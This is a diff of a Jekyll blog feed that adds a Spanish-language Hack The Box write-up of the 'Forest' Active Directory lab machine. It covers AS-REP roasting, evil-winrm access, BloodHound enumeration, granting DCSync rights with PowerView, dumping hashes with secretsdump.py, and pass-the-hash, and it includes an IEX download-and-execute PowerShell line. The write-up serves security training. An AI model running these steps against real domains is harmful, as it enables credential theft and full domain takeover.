@@ -1,4 +1,117 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-04T19:15:02-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>HTB - Agile</title><link href="http://localhost:4000/HTB-Agile/" rel="alternate" type="text/html" title="HTB - Agile" /><published>2023-08-04T00:00:00-05:00</published><updated>2023-08-04T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Agile</id><content type="html" xml:base="http://localhost:4000/HTB-Agile/">&lt;h2 id=&quot;analisis&quot;&gt;Analisis:&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-17T12:50:21-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>HTB - Forest</title><link href="http://localhost:4000/HTB-Forest/" rel="alternate" type="text/html" title="HTB - Forest" /><published>2023-08-13T00:00:00-05:00</published><updated>2023-08-13T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Forest</id><content type="html" xml:base="http://localhost:4000/HTB-Forest/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta maquina es de las primeras que nos sugiere la plataforma &lt;strong&gt;Hack The Box&lt;/strong&gt;, para practicar &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt;&lt;/strong&gt;, es una maquina de dificultad &lt;strong&gt;Easy&lt;/strong&gt;, pero aun asi… Tiene mucho que ofrecer.&lt;/p&gt;
+
+&lt;p&gt;Como siempre, comenzaremos con el &lt;strong&gt;Port Scanning&lt;/strong&gt;:
+&lt;img src=&quot;/assets/img/HTB_Forest/F1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos apreciar que tendremos muchos puertos abiertos, por lo que podemos deducir que estamos contra un sistema operativo &lt;strong&gt;Microsoft-Windows&lt;/strong&gt;, aunque esto tambien lo podemos saber por el TTL al momento de enviar un pauquete con el comando &lt;strong&gt;ping&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Nos queda ver los servicios y las versiones usadas para el servicio, por lo que tiramos del nmap:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Puertos&quot;&lt;/span&gt; &amp;lt;IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Desde aqui ya podemos ir viendo datos interesantes, como lo puede ser un dominio &lt;strong&gt;htb.local&lt;/strong&gt;, pero para asegurarnos usaremos herramientas de reconocimiento, como lo puede ser &lt;strong&gt;Crackmapexec&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Forest/F3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos apreciar que se repite el mismo dominio: &lt;strong&gt;“htb.local”&lt;/strong&gt;, por lo que lo podemos agregar al archivo del &lt;strong&gt;/etc/hosts&lt;/strong&gt;, tambien vemos que posiblemente tengamos vias potenciales por el servicio &lt;strong&gt;WinRM&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Pero si queremos listar archivos o informacion por medio del SMB, no vamos a ver nada:
+&lt;img src=&quot;/assets/img/HTB_Forest/F4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui es donde entra una herramienta que nos trae por defecto sistemas como Parrot o Kali: &lt;strong&gt;GetNPUsers.py&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Forest/F5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como nos reporta la informacion, vamos  a usar una de sus funciones, especificamente la primera, pero vamos a necesitar listar un usuario valido… Asi que lo vamos a listar sin pasarle ningun parametro:
+&lt;img src=&quot;/assets/img/HTB_Forest/F6.png&quot; alt=&quot;&quot; /&gt;
+Asi que ya  vamos a poder tener su TGT:
+&lt;img src=&quot;/assets/img/HTB_Forest/F7.png&quot; alt=&quot;&quot; /&gt;
+Entonces nos quedaria aplicarle Brute Force a al TGT que acabamos de obtener:
+&lt;img src=&quot;/assets/img/HTB_Forest/F8.png&quot; alt=&quot;&quot; /&gt;
+Vemos que tenemos credenciales para el usuario &lt;strong&gt;svc-alfresco&lt;/strong&gt;, asi que veremos si nos da un &lt;strong&gt;pwned&lt;/strong&gt; con Crackmapexec:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Usamos la herramienta &lt;strong&gt;evil-winrm&lt;/strong&gt; para conectarnos usando las credenciales que acabamos de obtener:
+&lt;img src=&quot;/assets/img/HTB_Forest/F10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez lograda la intrusion como usuario de bajos privilegios, nos toca llegar al usuario administrador, por lo que necesitaremos de una herramienta que nos liste vias potenciales para logarlo… Aqui es donde entra &lt;strong&gt;BloodHound&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Iniciaremos &lt;strong&gt;Neo4j&lt;/strong&gt;, y luego abriremos BloodHound para vinculara a la base de datos del Neo4j.
+&lt;img src=&quot;/assets/img/HTB_Forest/F11.png&quot; alt=&quot;&quot; /&gt;
+Una vez en la maquina necesitaremos de una herramienta:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&quot;&gt;Sharphound&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;La compartiremos a la maquina, existen varias formas… Yo use esta:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;Invoke-WebRequest&lt;/span&gt; -Uri &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IP&amp;gt;/SharpHound.ps1&quot;&lt;/span&gt; -OutFile &lt;span class=&quot;s2&quot;&gt;&quot;Directorio en la maquina&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Otra puede ser:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://ruta-del-archivo/mi-script.ps1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como sea, lo ejecutamos y obtendremos informacion que cargaremos al BloodHound en formato &lt;strong&gt;.zip&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Forest/F12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez cargado en el &lt;strong&gt;BloodHound&lt;/strong&gt;, nos dirigimos al usuario del que tenemos credenciales para ver rutas que nos permitan elevar nuestros privilegios:
+&lt;img src=&quot;/assets/img/HTB_Forest/F13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos la rama que nos lleva directamente al usuario administrador vemos que existe un privilegio que poseemos, este nos permite modificar el &lt;strong&gt;DACL&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;BloodHound nos va a dar una pista de como conseguir escalar privilegios:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero, veremos los grupos disponibles:
+&lt;img src=&quot;/assets/img/HTB_Forest/F16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que tenemos disponible el “Exchange Windows Permissions”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Entonces lo que haremos a continuacion es crear un usuario y agregarlo a ese grupo:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user &amp;lt;Usuario&amp;gt; &amp;lt;Password&amp;gt; /add /domain
+net &lt;span class=&quot;nb&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NOMBRE DEL GRUPO&quot;&lt;/span&gt; &amp;lt;usuario&amp;gt; /add
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos quedaria aplicar lo que nos dice BloodHound:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$SecPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;Password&amp;gt;'&lt;/span&gt; -AsPlainText -Force
+&lt;span class=&quot;nv&quot;&gt;$Cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'htb.local\user'&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$SecPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ahora bien, necesitaremos importar un binario en Powershell, &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una vez obtenido el binario, procuraremos a importarlo:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Import-Module ./&amp;lt;Nombre &lt;span class=&quot;nb&quot;&gt;del &lt;/span&gt;binario&amp;gt;
+&lt;span class=&quot;c1&quot;&gt;# Acto seguido Corremos el siguiente comando:&lt;/span&gt;
+Add-DomainObjectAcl -Credential &lt;span class=&quot;nv&quot;&gt;$Cred&lt;/span&gt; -TargetIdentity &lt;span class=&quot;s1&quot;&gt;'htb.local\Domain Admins'&lt;/span&gt; -PrincipalIdentity &amp;lt;Usuario&amp;gt; -Rights DCSync
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que nos quedaria dumpear la informacion, empleando la herramienta &lt;strong&gt;“secretsdump.py”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py htb.local/&amp;lt;USER&amp;gt;@10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, hemos dumpeado los hashes del administrador, por lo que ahora nos quedaria hacer un &lt;strong&gt;“pass the hash”&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Forest/F20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;FIN&lt;/h1&gt;</content><author><name>Al3xt0r</name></author><category term="Active Directory" /><category term="HTB" /><category term="CTF" /><category term="WriteUp" /><summary></summary></entry><entry><title>HTB - Agile</title><link href="http://localhost:4000/HTB-Agile/" rel="alternate" type="text/html" title="HTB - Agile" /><published>2023-08-04T00:00:00-05:00</published><updated>2023-08-04T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Agile</id><content type="html" xml:base="http://localhost:4000/HTB-Agile/">&lt;h2 id=&quot;analisis&quot;&gt;Analisis:&lt;/h2&gt;
 
 &lt;p&gt;Esta machine es de dificultad &lt;strong&gt;Medium&lt;/strong&gt;, Sistema Operativo &lt;strong&gt;Linux&lt;/strong&gt;
 &lt;img src=&quot;/assets/img/HTB_Agile/A0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
